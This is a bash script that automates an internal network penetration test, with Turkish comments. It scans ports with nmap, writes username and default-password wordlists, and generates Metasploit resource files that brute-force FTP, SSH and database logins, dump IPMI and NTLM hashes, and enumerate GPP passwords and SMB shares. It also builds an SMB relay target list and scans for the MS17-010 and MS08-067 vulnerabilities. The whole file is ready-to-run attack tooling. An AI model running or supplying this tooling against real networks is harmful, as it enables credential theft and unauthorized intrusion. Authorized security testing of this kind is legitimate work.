#sed -i 's/\r//g' script.sh
#last update: 08.02.2023

DOM_USER="USER"
DOM_PASS='PASS'
DOMAIN="DOMAIN"

BASE_DIR=$(pwd)
COMMERCIAL="demo_comp"

mkdir clear
mkdir raw
mkdir resource

echo "$(tput setaf 4)$(tput bold)[*]$(tput sgr0) Starting Network Enumeration"
nmap -p 21,22,23,25,80,443,445,8080,8081,1433,1521,3306,5432,27017,3260,5985,5986 -T4 -n --open -Pn -oG $BASE_DIR/raw/Ports-raw.txt -iL $BASE_DIR/tekli_kapsam.txt
nmap -sU -p 161,623 -T4 -n --open -Pn -oG $BASE_DIR/raw/Ports-rawu.txt -iL $BASE_DIR/tekli_kapsam.txt
grep -v -P '(?=.*filtered)' $BASE_DIR/raw/Ports-raw.txt > $BASE_DIR/raw/Ports-rawz.txt
grep -v -P '(?=.*filtered)' $BASE_DIR/raw/Ports-rawu.txt > $BASE_DIR/raw/Ports-rawuz.txt
echo "$(tput setaf 2)$(tput bold)[+]$(tput sgr0) Ended Network Enumeration"

echo ""
echo "$(tput setaf 4)$(tput bold)[*]$(tput sgr0) Starting Ports Grep"
grep "21/open" $BASE_DIR/raw/Ports-rawz.txt | cut -d " " -f2 >> $BASE_DIR/clear/P21.txt
grep "22/open" $BASE_DIR/raw/Ports-rawz.txt | cut -d " " -f2 >> $BASE_DIR/clear/P22.txt
grep "23/open" $BASE_DIR/raw/Ports-rawz.txt | cut -d " " -f2 >> $BASE_DIR/clear/P23.txt
grep "25/open" $BASE_DIR/raw/Ports-rawz.txt | cut -d " " -f2 >> $BASE_DIR/clear/P25.txt
grep "80/open" $BASE_DIR/raw/Ports-rawz.txt | cut -d " " -f2 >> $BASE_DIR/clear/P80.txt
grep "443/open" $BASE_DIR/raw/Ports-rawz.txt | cut -d " " -f2 >> $BASE_DIR/clear/P443.txt
grep "445/open" $BASE_DIR/raw/Ports-rawz.txt | cut -d " " -f2 >> $BASE_DIR/clear/P445.txt
grep "8080/open" $BASE_DIR/raw/Ports-rawz.txt | cut -d " " -f2 >> $BASE_DIR/clear/P8080.txt
grep "8081/open" $BASE_DIR/raw/Ports-rawz.txt | cut -d " " -f2 >> $BASE_DIR/clear/P8081.txt
grep "1433/open" $BASE_DIR/raw/Ports-rawz.txt | cut -d " " -f2 >> $BASE_DIR/clear/P1433.txt
grep "1521/open" $BASE_DIR/raw/Ports-rawz.txt | cut -d " " -f2 >> $BASE_DIR/clear/P1521.txt
grep "3306/open" $BASE_DIR/raw/Ports-rawz.txt | cut -d " " -f2 >> $BASE_DIR/clear/P3306.txt
grep "5432/open" $BASE_DIR/raw/Ports-rawz.txt | cut -d " " -f2 >> $BASE_DIR/clear/P5432.txt
grep "27017/open" $BASE_DIR/raw/Ports-rawz.txt | cut -d " " -f2 >> $BASE_DIR/clear/P27017.txt
grep "3260/open" $BASE_DIR/raw/Ports-rawz.txt | cut -d " " -f2 >> $BASE_DIR/clear/P3260.txt
grep "5985/open" $BASE_DIR/raw/Ports-rawz.txt | cut -d " " -f2 >> $BASE_DIR/clear/P5985.txt
grep "5986/open" $BASE_DIR/raw/Ports-rawz.txt | cut -d " " -f2 >> $BASE_DIR/clear/P5986.txt
grep "161/open" $BASE_DIR/raw/Ports-rawuz.txt | cut -d " " -f2 >> $BASE_DIR/clear/P161.txt
grep "623/open" $BASE_DIR/raw/Ports-rawuz.txt | cut -d " " -f2 >> $BASE_DIR/clear/P623.txt
cat $BASE_DIR/clear/P5985.txt >> $BASE_DIR/clear/winrmz.txt
cat $BASE_DIR/clear/P5986.txt >> $BASE_DIR/clear/winrmz.txt
sort $BASE_DIR/clear/winrmz.txt | uniq -u >> $BASE_DIR/clear/winrm.txt
rm -rf $BASE_DIR/clear/winrmz.txt
echo "$(tput setaf 2)$(tput bold)[+]$(tput sgr0) Ended Ports Grep"

echo ""
echo "$(tput setaf 4)$(tput bold)[*]$(tput sgr0) Creating MSF Files"
#Brute Force List
echo "root" > $BASE_DIR/resource/user
echo "user" >> $BASE_DIR/resource/user
echo "guest" >> $BASE_DIR/resource/user
echo "admin" >> $BASE_DIR/resource/user
echo "administrator" >> $BASE_DIR/resource/user
echo "cisco" >> $BASE_DIR/resource/user
#
echo "pass" > $BASE_DIR/resource/pass
echo "root" >> $BASE_DIR/resource/pass
echo "toor" >> $BASE_DIR/resource/pass
echo "guest" >> $BASE_DIR/resource/pass
echo "user" >> $BASE_DIR/resource/pass
echo "resu" >> $BASE_DIR/resource/pass
echo "1234" >> $BASE_DIR/resource/pass
echo "12345" >> $BASE_DIR/resource/pass
echo "123456" >> $BASE_DIR/resource/pass
echo "Aa123456" >> $BASE_DIR/resource/pass
echo "calvin" >> $BASE_DIR/resource/pass
echo "cisco" >> $BASE_DIR/resource/pass
#
echo "sa" >> $BASE_DIR/resource/userdb.txt
echo "" >> $BASE_DIR/resource/userdb.txt
echo "root" >> $BASE_DIR/resource/userdb.txt
echo "mongo" >> $BASE_DIR/resource/userdb.txt
echo "admin" >> $BASE_DIR/resource/userdb.txt
echo "postgres" >> $BASE_DIR/resource/userdb.txt
echo "scott" >> $BASE_DIR/resource/userdb.txt
echo "secure" >> $BASE_DIR/resource/userdb.txt
echo "wasadmin" >> $BASE_DIR/resource/userdb.txt
echo "maxadmin" >> $BASE_DIR/resource/userdb.txt
echo "cloudera" >> $BASE_DIR/resource/userdb.txt
echo "dbuser" >> $BASE_DIR/resource/userdb.txt
echo "superdba" >> $BASE_DIR/resource/userdb.txt
echo "sysdba" >> $BASE_DIR/resource/userdb.txt
echo "administrator" >> $BASE_DIR/resource/userdb.txt
echo "webdb" >> $BASE_DIR/resource/userdb.txt
echo "sysadm" >> $BASE_DIR/resource/userdb.txt
echo "dcmadmin" >> $BASE_DIR/resource/userdb.txt
#
echo "pass" >> $BASE_DIR/resource/passdb.txt
echo "as" >> $BASE_DIR/resource/passdb.txt
echo "sa" >> $BASE_DIR/resource/passdb.txt
echo "toor" >> $BASE_DIR/resource/passdb.txt
echo "admin" >> $BASE_DIR/resource/passdb.txt
echo "mongo" >> $BASE_DIR/resource/passdb.txt
echo "tiger" >> $BASE_DIR/resource/passdb.txt
echo "postgres" >> $BASE_DIR/resource/passdb.txt
echo "amber" >> $BASE_DIR/resource/passdb.txt
echo "akf7d98s2" >> $BASE_DIR/resource/passdb.txt
echo "AKF7D98S2" >> $BASE_DIR/resource/passdb.txt
echo "cloudera" >> $BASE_DIR/resource/passdb.txt
echo "p@ck3tf3nc3" >> $BASE_DIR/resource/passdb.txt
echo "RPSsql12345" >> $BASE_DIR/resource/passdb.txt
echo "N'*ARIS!1dm9n#'" >> $BASE_DIR/resource/passdb.txt
echo 'DBA!sa@EMSDB123' >> $BASE_DIR/resource/passdb.txt
echo 'V4in$ight' >> $BASE_DIR/resource/passdb.txt
echo "Pass@123" >> $BASE_DIR/resource/passdb.txt
echo 'M3d!aP0rtal' >> $BASE_DIR/resource/passdb.txt
echo "#SAPassword!" >> $BASE_DIR/resource/passdb.txt
echo "maxadmin" >> $BASE_DIR/resource/passdb.txt
echo "wasadmin" >> $BASE_DIR/resource/passdb.txt
echo "123qweASD#" >> $BASE_DIR/resource/passdb.txt
echo "123qweASD#" >> $BASE_DIR/resource/passdb.txt
echo "password" >> $BASE_DIR/resource/passdb.txt
echo "passw0rd" >> $BASE_DIR/resource/passdb.txt
echo '1qaz2wsx' >> $BASE_DIR/resource/passdb.txt
echo '1Qazxsw2' >> $BASE_DIR/resource/passdb.txt
echo '1q2w3e4r5t' >> $BASE_DIR/resource/passdb.txt
echo '1qaz3edc5tgb' >> $BASE_DIR/resource/passdb.txt
echo '2wsx4rfv' >> $BASE_DIR/resource/passdb.txt
echo '2wsXVfr4' >> $BASE_DIR/resource/passdb.txt
echo '1qaz4rfv' >> $BASE_DIR/resource/passdb.txt
echo '1qaZXsw23' >> $BASE_DIR/resource/passdb.txt
echo '1qaz2wsx!' >> $BASE_DIR/resource/passdb.txt
echo '1Qazxsw2!' >> $BASE_DIR/resource/passdb.txt
echo '1q2w3e4r5t!' >> $BASE_DIR/resource/passdb.txt
echo '1qaz3edc5tgb!' >> $BASE_DIR/resource/passdb.txt
echo '2wsx4rfv!' >> $BASE_DIR/resource/passdb.txt
echo '2wsXVfr4!' >> $BASE_DIR/resource/passdb.txt
echo '1qaz4rfv!' >> $BASE_DIR/resource/passdb.txt
echo '1qaZXsw23!' >> $BASE_DIR/resource/passdb.txt
echo 'Password1' >> $BASE_DIR/resource/passdb.txt
echo 'Password!1' >> $BASE_DIR/resource/passdb.txt
echo 'Password!12' >> $BASE_DIR/resource/passdb.txt
echo 'Password!123' >> $BASE_DIR/resource/passdb.txt
echo 'Password!' >> $BASE_DIR/resource/passdb.txt
echo 'Passw0rd' >> $BASE_DIR/resource/passdb.txt
echo 'Passw0rd1' >> $BASE_DIR/resource/passdb.txt
echo 'Passw0rd!' >> $BASE_DIR/resource/passdb.txt
echo 'p@ssw0rd' >> $BASE_DIR/resource/passdb.txt
echo 'p@ssw0rd1' >> $BASE_DIR/resource/passdb.txt
echo 'p@ssw0rd!' >> $BASE_DIR/resource/passdb.txt
echo 'p@ssword' >> $BASE_DIR/resource/passdb.txt
echo 'p@ssword1' >> $BASE_DIR/resource/passdb.txt
echo 'p@ssword!' >> $BASE_DIR/resource/passdb.txt
echo 'P@ssw0rd' >> $BASE_DIR/resource/passdb.txt
echo 'P@ssw0rd1' >> $BASE_DIR/resource/passdb.txt
echo 'P@ssw0rd!' >> $BASE_DIR/resource/passdb.txt
echo 'P@ssword' >> $BASE_DIR/resource/passdb.txt
echo 'P@ssword1' >> $BASE_DIR/resource/passdb.txt
echo 'P@ssword!' >> $BASE_DIR/resource/passdb.txt
echo 'EE76ak76' >> $BASE_DIR/resource/passdb.txt
echo 'Aa123456' >> $BASE_DIR/resource/passdb.txt
echo 'aA123456' >> $BASE_DIR/resource/passdb.txt
echo 'Aa123456!' >> $BASE_DIR/resource/passdb.txt
echo 'aA123456!' >> $BASE_DIR/resource/passdb.txt
echo 'Ab123456' >> $BASE_DIR/resource/passdb.txt
echo 'aB123456' >> $BASE_DIR/resource/passdb.txt
echo 'Ab123456!' >> $BASE_DIR/resource/passdb.txt
echo 'aB123456!' >> $BASE_DIR/resource/passdb.txt
echo 'Asd12345' >> $BASE_DIR/resource/passdb.txt
echo 'Password1!' >> $BASE_DIR/resource/passdb.txt
echo 'Password123!' >> $BASE_DIR/resource/passdb.txt
echo 'Password2!' >> $BASE_DIR/resource/passdb.txt

#SMBSid
echo "workspace -a $COMMERCIAL" > $BASE_DIR/resource/smbsid.rc
echo "use auxiliary/scanner/smb/smb_lookupsid" >> $BASE_DIR/resource/smbsid.rc
echo "set MaxRID 1200" >> $BASE_DIR/resource/smbsid.rc
echo "set RHOSTS file:$BASE_DIR/clear/P445.txt" >> $BASE_DIR/resource/smbsid.rc
echo "set THREADS 20" >> $BASE_DIR/resource/smbsid.rc
echo "spool $BASE_DIR/raw/smbsid-raw.txt" >> $BASE_DIR/resource/smbsid.rc
echo "run" >> $BASE_DIR/resource/smbsid.rc
echo "spool off" >> $BASE_DIR/resource/smbsid.rc
echo "exit" >> $BASE_DIR/resource/smbsid.rc

#SNMP
echo "workspace -a $COMMERCIAL" > $BASE_DIR/resource/snmp.rc
echo "use auxiliary/scanner/snmp/snmp_enum" >> $BASE_DIR/resource/snmp.rc
echo "set RHOSTS file:$BASE_DIR/clear/P161.txt" >> $BASE_DIR/resource/snmp.rc
echo "set THREADS 40" >> $BASE_DIR/resource/snmp.rc
echo "spool $BASE_DIR/raw/snmp-raw.txt" >> $BASE_DIR/resource/snmp.rc
echo "run" >> $BASE_DIR/resource/snmp.rc
echo "spool off" >> $BASE_DIR/resource/snmp.rc
echo "exit" >> $BASE_DIR/resource/snmp.rc

#FTP Brute
echo "workspace -a $COMMERCIAL" > $BASE_DIR/resource/ftp.rc
echo "use auxiliary/scanner/ftp/ftp_login" >> $BASE_DIR/resource/ftp.rc
echo "set RHOSTS file:$BASE_DIR/clear/P21.txt" >> $BASE_DIR/resource/ftp.rc
echo "set USER_FILE $BASE_DIR/resource/user" >> $BASE_DIR/resource/ftp.rc
echo "set PASS_FILE $BASE_DIR/resource/pass" >> $BASE_DIR/resource/ftp.rc
echo "set THREADS 20" >> $BASE_DIR/resource/ftp.rc
echo "spool $BASE_DIR/raw/ftp-brute-raw.txt" >> $BASE_DIR/resource/ftp.rc
echo "run" >> $BASE_DIR/resource/ftp.rc
echo "spool off" >> $BASE_DIR/resource/ftp.rc
echo "exit" >> $BASE_DIR/resource/ftp.rc

#FTP Anonymous
echo "workspace -a $COMMERCIAL" > $BASE_DIR/resource/ftp-anon.rc
echo "use auxiliary/scanner/ftp/anonymous" >> $BASE_DIR/resource/ftp-anon.rc
echo "set RHOSTS file:$BASE_DIR/clear/P21.txt" >> $BASE_DIR/resource/ftp-anon.rc
echo "set THREADS 20" >> $BASE_DIR/resource/ftp-anon.rc
echo "spool $BASE_DIR/raw/ftp-anon-raw.txt" >> $BASE_DIR/resource/ftp-anon.rc
echo "run" >> $BASE_DIR/resource/ftp-anon.rc
echo "spool off" >> $BASE_DIR/resource/ftp-anon.rc
echo "exit" >> $BASE_DIR/resource/ftp-anon.rc

#SSH Brute
echo "workspace -a $COMMERCIAL" > $BASE_DIR/resource/ssh.rc
echo "use auxiliary/scanner/ssh/ssh_login" >> $BASE_DIR/resource/ssh.rc
echo "set RHOSTS file:$BASE_DIR/clear/P22.txt" >> $BASE_DIR/resource/ssh.rc
echo "set USER_FILE $BASE_DIR/resource/user" >> $BASE_DIR/resource/ssh.rc
echo "set PASS_FILE $BASE_DIR/resource/pass" >> $BASE_DIR/resource/ssh.rc
echo "set THREADS 20" >> $BASE_DIR/resource/ssh.rc
echo "spool $BASE_DIR/raw/ssh-brute-raw.txt" >> $BASE_DIR/resource/ssh.rc
echo "run" >> $BASE_DIR/resource/ssh.rc
echo "spool off" >> $BASE_DIR/resource/ssh.rc
echo "exit" >> $BASE_DIR/resource/ssh.rc

#ipmi
echo "workspace -a $COMMERCIAL" > $BASE_DIR/resource/ipmi.rc
echo "use auxiliary/scanner/ipmi/ipmi_dumphashes" >> $BASE_DIR/resource/ipmi.rc
echo "set RHOSTS file:$BASE_DIR/clear/P623.txt" >> $BASE_DIR/resource/ipmi.rc
echo "spool $BASE_DIR/raw/ipmi-brute-raw.txt" >> $BASE_DIR/resource/ipmi.rc
echo "run" >> $BASE_DIR/resource/ipmi.rc
echo "spool off" >> $BASE_DIR/resource/ipmi.rc
echo "exit" >> $BASE_DIR/resource/ipmi.rc

#iSCSi
echo ""
echo "$(tput setaf 4)$(tput bold)[*]$(tput sgr0) started creating iscsi.sh"
service iscsid restart
echo 'for i in $(cat ../clear/P3260.txt); do echo ´##########´ $i ´##########´; iscsiadm -m discovery -t sendtargets -p $i; done' > $BASE_DIR/resource/iscsi.sh
chmod +x $BASE_DIR/resource/iscsi.sh
echo "$(tput setaf 2)$(tput bold)[+]$(tput sgr0) ended creating iscsi.sh"

#PostgreSQL Brute 1
echo "workspace -a $COMMERCIAL" > $BASE_DIR/resource/postgresql1.rc
echo "use auxiliary/scanner/postgres/postgres_login" >> $BASE_DIR/resource/postgresql1.rc
echo "set RHOSTS file:$BASE_DIR/clear/P5432.txt" >> $BASE_DIR/resource/postgresql1.rc
echo "set BLANK_PASSWORDS true" >> $BASE_DIR/resource/postgresql1.rc
echo "set PASS_FILE $BASE_DIR/resource/passdb.txt" >> $BASE_DIR/resource/postgresql1.rc
echo "unset USERPASS_FILE" >> $BASE_DIR/resource/postgresql1.rc
echo "set USER_FILE $BASE_DIR/resource/userdb.txt" >> $BASE_DIR/resource/postgresql1.rc
echo "set USER_AS_PASS true" >> $BASE_DIR/resource/postgresql1.rc
echo "spool $BASE_DIR/raw/postgresql-brute-raw.txt" >> $BASE_DIR/resource/postgresql1.rc
echo "run" >> $BASE_DIR/resource/postgresql1.rc
echo "spool off" >> $BASE_DIR/resource/postgresql1.rc
echo "exit" >> $BASE_DIR/resource/postgresql1.rc
echo "$(tput setaf 2)$(tput bold)[+]$(tput sgr0) Created MSF Files"

#PostgreSQL Brute 2
#echo "workspace -a $COMMERCIAL" > $BASE_DIR/resource/postgresql2.rc
#echo "use auxiliary/scanner/postgres/postgres_login" >> $BASE_DIR/resource/postgresql2.rc
#echo "set RHOSTS file:$BASE_DIR/clear/P5432.txt" >> $BASE_DIR/resource/postgresql2.rc
#echo "set DATABASE template1" >> $BASE_DIR/resource/postgresql2.rc
#echo "set BLANK_PASSWORDS true" >> $BASE_DIR/resource/postgresql2.rc
#echo "spool $BASE_DIR/raw/postgresql-brute-raw.txt" >> $BASE_DIR/resource/postgresql2.rc
#echo "run" >> $BASE_DIR/resource/postgresql2.rc
#echo "spool off" >> $BASE_DIR/resource/postgresql2.rc
#echo "exit" >> $BASE_DIR/resource/postgresql2.rc
#echo "$(tput setaf 2)$(tput bold)[+]$(tput sgr0) Created MSF Files"

#PostgreSQL Brute 2
#echo "workspace -a $COMMERCIAL" > $BASE_DIR/resource/postgresql3.rc
#echo "use auxiliary/scanner/postgres/postgres_login" >> $BASE_DIR/resource/postgresql3.rc
#echo "set RHOSTS file:$BASE_DIR/clear/P5432.txt" >> $BASE_DIR/resource/postgresql3.rc
#echo "set DATABASE postgres" >> $BASE_DIR/resource/postgresql3.rc
#echo "set BLANK_PASSWORDS true" >> $BASE_DIR/resource/postgresql3.rc
#echo "spool $BASE_DIR/raw/postgresql-brute-raw.txt" >> $BASE_DIR/resource/postgresql3.rc
#echo "run" >> $BASE_DIR/resource/postgresql3.rc
#echo "spool off" >> $BASE_DIR/resource/postgresql3.rc
#echo "exit" >> $BASE_DIR/resource/postgresql3.rc
#echo "$(tput setaf 2)$(tput bold)[+]$(tput sgr0) Created MSF Files"

#MongoDB Brute 1
echo "workspace -a $COMMERCIAL" > $BASE_DIR/resource/mongodb1.rc
echo "use auxiliary/scanner/mongodb/mongodb_login" >> $BASE_DIR/resource/mongodb1.rc
echo "set RHOSTS file:$BASE_DIR/clear/P27017.txt" >> $BASE_DIR/resource/mongodb1.rc
echo "set PASS_FILE $BASE_DIR/resource/passdb.txt" >> $BASE_DIR/resource/mongodb1.rc
echo "set USER_AS_PASS true" >> $BASE_DIR/resource/mongodb1.rc
echo "set DB admin" >> $BASE_DIR/resource/mongodb1.rc
echo "set USER_FILE $BASE_DIR/resource/userdb.txt" >> $BASE_DIR/resource/mongodb1.rc
echo "set BLANK_PASSWORDS true" >> $BASE_DIR/resource/mongodb1.rc
echo "spool $BASE_DIR/raw/mogodb-brute-raw.txt" >> $BASE_DIR/resource/mongodb1.rc
echo "run" >> $BASE_DIR/resource/mongodb1.rc
echo "spool off" >> $BASE_DIR/resource/mongodb1.rc
echo "exit" >> $BASE_DIR/resource/mongodb1.rc
echo "$(tput setaf 2)$(tput bold)[+]$(tput sgr0) Created MSF Files"

#MongoDB Brute 2
#echo "workspace -a $COMMERCIAL" > $BASE_DIR/resource/mongodb2.rc
#echo "use auxiliary/scanner/mongodb/mongodb_login" >> $BASE_DIR/resource/mongodb2.rc
#echo "set RHOSTS file:$BASE_DIR/clear/P27017.txt" >> $BASE_DIR/resource/mongodb2.rc
#echo "set PASS_FILE $BASE_DIR/resource/passdb.txt" >> $BASE_DIR/resource/mongodb2.rc
#echo "set USER_AS_PASS true" >> $BASE_DIR/resource/mongodb2.rc
#echo "set DB local" >> $BASE_DIR/resource/mongodb2.rc
#echo "set USER_FILE $BASE_DIR/resource/userdb.txt" >> $BASE_DIR/resource/mongodb2.rc
#echo "set BLANK_PASSWORDS true" >> $BASE_DIR/resource/mongodb2.rc
#echo "spool $BASE_DIR/raw/mogodb-brute-raw.txt" >> $BASE_DIR/resource/mongodb2.rc
#echo "run" >> $BASE_DIR/resource/mongodb2.rc
#echo "spool off" >> $BASE_DIR/resource/mongodb2.rc
#echo "exit" >> $BASE_DIR/resource/mongodb2.rc
#echo "$(tput setaf 2)$(tput bold)[+]$(tput sgr0) Created MSF Files"

#MongoDB Brute 3
#echo "workspace -a $COMMERCIAL" > $BASE_DIR/resource/mongodb3.rc
#echo "use auxiliary/scanner/mongodb/mongodb_login" >> $BASE_DIR/resource/mongodb3.rc
#echo "set RHOSTS file:$BASE_DIR/clear/P27017.txt" >> $BASE_DIR/resource/mongodb3.rc
#echo "set PASS_FILE $BASE_DIR/resource/passdb.txt" >> $BASE_DIR/resource/mongodb3.rc
#echo "set USER_AS_PASS true" >> $BASE_DIR/resource/mongodb3.rc
#echo "set DB config" >> $BASE_DIR/resource/mongodb3.rc
#echo "set USER_FILE $BASE_DIR/resource/userdb.txt" >> $BASE_DIR/resource/mongodb3.rc
#echo "set BLANK_PASSWORDS true" >> $BASE_DIR/resource/mongodb3.rc
#echo "spool $BASE_DIR/raw/mogodb-brute-raw.txt" >> $BASE_DIR/resource/mongodb3.rc
#echo "run" >> $BASE_DIR/resource/mongodb3.rc
#echo "spool off" >> $BASE_DIR/resource/mongodb3.rc
#echo "exit" >> $BASE_DIR/resource/mongodb3.rc
#echo "$(tput setaf 2)$(tput bold)[+]$(tput sgr0) Created MSF Files"

#MySQL Brute
echo "workspace -a $COMMERCIAL" > $BASE_DIR/resource/mysql.rc
echo "use auxiliary/scanner/mysql/mysql_login" >> $BASE_DIR/resource/mysql.rc
echo "set RHOSTS file:$BASE_DIR/clear/P3306.txt" >> $BASE_DIR/resource/mysql.rc
echo "set PASS_FILE $BASE_DIR/resource/passdb.txt" >> $BASE_DIR/resource/mysql.rc
echo "set USER_AS_PASS true" >> $BASE_DIR/resource/mysql.rc
echo "spool $BASE_DIR/raw/mysql-brute-raw.txt" >> $BASE_DIR/resource/mysql.rc
echo "run" >> $BASE_DIR/resource/mysql.rc
echo "spool off" >> $BASE_DIR/resource/mysql.rc
echo "exit" >> $BASE_DIR/resource/mysql.rc
echo "$(tput setaf 2)$(tput bold)[+]$(tput sgr0) Created MSF Files"

#mssql brute
echo "workspace -a $COMMERCIAL" > $BASE_DIR/resource/mssql.rc
echo "use auxiliary/scanner/mssql/mssql_login" >> $BASE_DIR/resource/mssql.rc
echo "set RHOSTS file:$BASE_DIR/clear/P1433.txt" >> $BASE_DIR/resource/mssql.rc
echo "set PASS_FILE $BASE_DIR/resource/passdb.txt" >> $BASE_DIR/resource/mssql.rc
echo "set USER_AS_PASS true" >> $BASE_DIR/resource/mssql.rc
echo "spool $BASE_DIR/raw/mssql-brute-raw.txt" >> $BASE_DIR/resource/mssql.rc
echo "run" >> $BASE_DIR/resource/mssql.rc
echo "spool off" >> $BASE_DIR/resource/mssql.rc
echo "exit" >> $BASE_DIR/resource/mssql.rc
echo "$(tput setaf 2)$(tput bold)[+]$(tput sgr0) Created MSF Files"

#mssql xp_dirtree
echo "workspace -a $COMMERCIAL" > $BASE_DIR/resource/dirtree.rc
echo "use auxiliary/admin/mssql/mssql_ntlm_stealer" >> $BASE_DIR/resource/dirtree.rc
echo "set RHOSTS file:$BASE_DIR/clear/P1433.txt" >> $BASE_DIR/resource/dirtree.rc
echo "set PASSWORD $DOM_PASS" >> $BASE_DIR/resource/dirtree.rc
echo "set USERNAME $DOM_USER" >> $BASE_DIR/resource/dirtree.rc
echo "set DOMAIN $DOMAIN" >> $BASE_DIR/resource/dirtree.rc
echo "set USE_WINDOWS_AUTHENT true" >> $BASE_DIR/resource/dirtree.rc
echo "spool $BASE_DIR/raw/mssql-brute-raw.txt" >> $BASE_DIR/resource/dirtree.rc
echo "run" >> $BASE_DIR/resource/dirtree.rc
echo "spool off" >> $BASE_DIR/resource/dirtree.rc
echo "exit" >> $BASE_DIR/resource/dirtree.rc
echo "$(tput setaf 2)$(tput bold)[+]$(tput sgr0) Created MSF Files"

#oracle brute nse
#orijinali nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL <host>
#bu şekilde çalışmasını umut ediyorum
echo '#!/bin/bash'>> $BASE_DIR/resource/oraclebrute.sh
echo "" >> $BASE_DIR/resource/oraclebrute.sh
echo 'echo "ORCL sid"'>> $BASE_DIR/resource/oraclebrute.sh
echo 'nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL -iL ../clear/P1521.txt'>> $BASE_DIR/resource/oraclebrute.sh
echo 'echo ""; echo "XE sid"'>> $BASE_DIR/resource/oraclebrute.sh
echo 'nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=XE -iL ../clear/P1521.txt'>> $BASE_DIR/resource/oraclebrute.sh
chmod +x $BASE_DIR/resource/oraclebrute.sh

#oracle sid enum
echo "workspace -a $COMMERCIAL" > $BASE_DIR/resource/oraclesid.rc
echo "use auxiliary/scanner/oracle/sid_enum" >> $BASE_DIR/resource/oraclesid.rc
echo "set RHOSTS file:$BASE_DIR/clear/P1521.txt" >> $BASE_DIR/resource/oraclesid.rc
echo "spool $BASE_DIR/raw/oracletns-brute-raw.txt" >> $BASE_DIR/resource/oraclesid.rc
echo "run" >> $BASE_DIR/resource/oraclesid.rc
echo "spool off" >> $BASE_DIR/resource/oraclesid.rc
echo "exit" >> $BASE_DIR/resource/oraclesid.rc
echo "$(tput setaf 2)$(tput bold)[+]$(tput sgr0) Created MSF Files"

#oracle tns
echo "workspace -a $COMMERCIAL" > $BASE_DIR/resource/oracletns.rc
echo "use auxiliary/scanner/oracle/tnspoison_checker" >> $BASE_DIR/resource/oracletns.rc
echo "set RHOSTS file:$BASE_DIR/clear/P1521.txt" >> $BASE_DIR/resource/oracletns.rc
echo "spool $BASE_DIR/raw/oracletns-brute-raw.txt" >> $BASE_DIR/resource/oracletns.rc
echo "run" >> $BASE_DIR/resource/oracletns.rc
echo "spool off" >> $BASE_DIR/resource/oracletns.rc
echo "exit" >> $BASE_DIR/resource/oracletns.rc
echo "$(tput setaf 2)$(tput bold)[+]$(tput sgr0) Created MSF Files"

#gpp
echo "workspace -a $COMMERCIAL" > $BASE_DIR/resource/gpp.rc
echo "use scanner/smb/smb_enum_gpp" >> $BASE_DIR/resource/gpp.rc
echo "set RHOSTS file:$BASE_DIR/clear/P445.txt" >> $BASE_DIR/resource/gpp.rc
echo "set SMBUser $DOM_USER" >> $BASE_DIR/resource/gpp.rc
echo "set SMBPass $DOM_PASS" >> $BASE_DIR/resource/gpp.rc
echo "set SMBDomain $DOMAIN" >> $BASE_DIR/resource/gpp.rc
echo "spool $BASE_DIR/raw/oracletns-brute-raw.txt" >> $BASE_DIR/resource/gpp.rc
echo "run" >> $BASE_DIR/resource/gpp.rc
echo "spool off" >> $BASE_DIR/resource/gpp.rc
echo "exit" >> $BASE_DIR/resource/gpp.rc
echo "$(tput setaf 2)$(tput bold)[+]$(tput sgr0) Created MSF Files"

#SMBSigning
echo ""
echo "$(tput setaf 4)$(tput bold)[*]$(tput sgr0) Starting SMB Signing"
crackmapexec smb $BASE_DIR/clear/P445.txt --gen-relay-list $BASE_DIR/clear/targets.txt
echo "$(tput setaf 2)$(tput bold)[+]$(tput sgr0) Ended SMB Signing"

echo ""
echo "$(tput setaf 4)$(tput bold)[*]$(tput sgr0) Starting SMB Share Without User"
crackmapexec smb $BASE_DIR/clear/P445.txt -d '' -u '' -p '' --shares > $BASE_DIR/raw/SMBSharesNoUser.txt
egrep -e "(WRITE|READ)" $BASE_DIR/raw/SMBSharesNoUser.txt > $BASE_DIR/clear/sharenouser.txt
echo "$(tput setaf 2)$(tput bold)[+]$(tput sgr0) Ended SMB Share Without User"

echo ""
echo "$(tput setaf 4)$(tput bold)[*]$(tput sgr0) Starting SMB Share With User"
crackmapexec smb $BASE_DIR/clear/P445.txt -d $DOMAIN -u $DOM_USER -p $DOM_PASS --shares > $BASE_DIR/raw/SMBSharesWithUser.txt
egrep -e "(WRITE|READ)" $BASE_DIR/raw/SMBSharesWithUser.txt > $BASE_DIR/clear/shareuser.txt
echo "$(tput setaf 2)$(tput bold)[+]$(tput sgr0) Ended SMB Share With User"

#Ms17-010
echo ""
echo "$(tput setaf 4)$(tput bold)[*]$(tput sgr0) Starting Ms17-010 Vuln"
nmap -p 445 -n -Pn --script smb-vuln-ms17-010.nse -iL $BASE_DIR/clear/P445.txt -oN $BASE_DIR/raw/Ms17-raw.nmap > /dev/null
cat $BASE_DIR/raw/Ms17-raw.nmap | grep "smb-vuln-ms17-010:" -B 7 | grep -w for | cut -d ' ' -f 5 >> $BASE_DIR/clear/Ms17_010.txt
while read -r line; 
    do echo "$(tput setaf 1)$(tput bold)[*] $line$(tput sgr0)"; 
done < $BASE_DIR/clear/Ms17_010.txt
echo "$(tput setaf 2)$(tput bold)[+]$(tput sgr0) Ended Ms17-010 Vuln"

#Ms08-067
echo ""
echo "$(tput setaf 4)$(tput bold)[*]$(tput sgr0) Starting Ms08-067 Vuln"
nmap -p 445 -n -Pn --script smb-vuln-ms08-067.nse -iL $BASE_DIR/clear/P445.txt -oN $BASE_DIR/raw/Ms08-raw.nmap > /dev/null
cat $BASE_DIR/raw/Ms08-raw.nmap | grep "smb-vuln-ms08-067:" -B 7 | grep -w for | cut -d ' ' -f 5 >> $BASE_DIR/clear/Ms08_067.txt
while read -r line; 
    do echo "$(tput setaf 1)$(tput bold)[*] $line$(tput sgr0)"; 
done < $BASE_DIR/clear/Ms08_067.txt
echo "$(tput setaf 2)$(tput bold)[+]$(tput sgr0) Ended Ms08-067 Vuln"

cd clear
find . -type f -size 0 -delete
cd ..

if [ ! -f $BASE_DIR/clear/P21.txt ]; then
	rm -rf $BASE_DIR/resource/ftp.rc $BASE_DIR/resource/ftp-anon.rc
	echo "$(tput setaf 2)$(tput bold)ftp yok"
fi

if [ ! -f $BASE_DIR/clear/P22.txt ]; then
	rm -rf $BASE_DIR/resource/ssh.rc
	echo "$(tput setaf 2)$(tput bold)ssh yok"
fi

